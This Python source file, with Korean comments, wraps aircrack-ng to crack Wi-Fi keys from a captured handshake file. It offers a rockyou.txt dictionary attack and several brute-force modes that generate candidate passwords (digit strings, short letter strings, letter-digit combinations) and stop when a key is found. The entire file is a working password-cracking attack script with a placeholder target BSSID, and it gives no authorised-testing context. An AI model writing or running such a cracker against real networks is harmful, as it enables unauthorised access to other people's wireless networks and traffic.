import itertools
import subprocess
import os
import tempfile
import string


def start_dictionary_crack(cap_file, status_callback=None):
    wordlist_path = "/usr/share/wordlists/rockyou.txt"
    cmd = ["aircrack-ng", "-w", wordlist_path, "-b", "TARGET_BSSID", cap_file]

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        for line in iter(process.stdout.readline, ''):
            if status_callback:
                status_callback(line.strip())
            if "KEY FOUND!" in line:
                return line.strip()
        return None
    except Exception as e:
        if status_callback:
            status_callback(f"에러 발생: {e}")
        return None


def generate_wordlist_and_crack(cap_file, charset, min_len, max_len, status_callback):
    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp:
        wordlist_path = tmp.name
        count = 0
        try:
            for length in range(min_len, max_len + 1):
                for combo in itertools.product(charset, repeat=length):
                    password = ''.join(combo)
                    tmp.write(password + '\n')
                    count += 1
                    if count % 10000 == 0 and status_callback:
                        status_callback(f"{count}개의 패스워드 생성됨...")

            tmp.flush()
            if status_callback:
                status_callback(f"총 {count}개의 패스워드 생성 완료. aircrack-ng 시작...")

            return run_aircrack(cap_file, wordlist_path, status_callback)
        finally:
            os.remove(wordlist_path)


def run_aircrack(cap_file, wordlist, status_callback):
    cmd = ["aircrack-ng", "-w", wordlist, "-b", "TARGET_BSSID", cap_file]
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in iter(process.stdout.readline, ''):
            if status_callback:
                status_callback(line.strip())
            if "KEY FOUND!" in line:
                return line.strip()
        return None
    except Exception as e:
        if status_callback:
            status_callback(f"에러 발생: {e}")
        return None


def start_crack(cap_file_path, method=4, status_callback=None):
    if method == 1:
        # 숫자만 무차별 대입 (예: 4~8자리)
        return generate_wordlist_and_crack(cap_file_path, string.digits, 4, 8, status_callback)

    elif method == 2:
        # 7자리 이하 영어
        return generate_wordlist_and_crack(cap_file_path, string.ascii_letters, 1, 7, status_callback)

    elif method == 3:
        # 영어 1~5자리 + 숫자 1~4자리 조합
        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp:
            wordlist_path = tmp.name
            count = 0
            try:
                for len_alpha in range(1, 6):
                    for len_digit in range(1, 5):
                        for alpha in itertools.product(string.ascii_lowercase, repeat=len_alpha):
                            for digit in itertools.product(string.digits, repeat=len_digit):
                                password = ''.join(alpha) + ''.join(digit)
                                tmp.write(password + '\n')
                                count += 1
                                if count % 10000 == 0 and status_callback:
                                    status_callback(f"{count}개 패스워드 생성 중...")
                tmp.flush()
                if status_callback:
                    status_callback(f"총 {count}개의 패스워드 생성 완료. aircrack-ng 시작...")
                return run_aircrack(cap_file_path, wordlist_path, status_callback)
            finally:
                os.remove(wordlist_path)

    elif method == 4:
        # 딕셔너리 기반
        return start_dictionary_crack(cap_file_path, status_callback)

    elif method == 5:
        # 스킵
        if status_callback:
            status_callback("크랙 과정을 스킵합니다.")
        return "SKIPPED"

    else:
        if status_callback:
            status_callback("알 수 없는 크랙 방식입니다.")
        return None
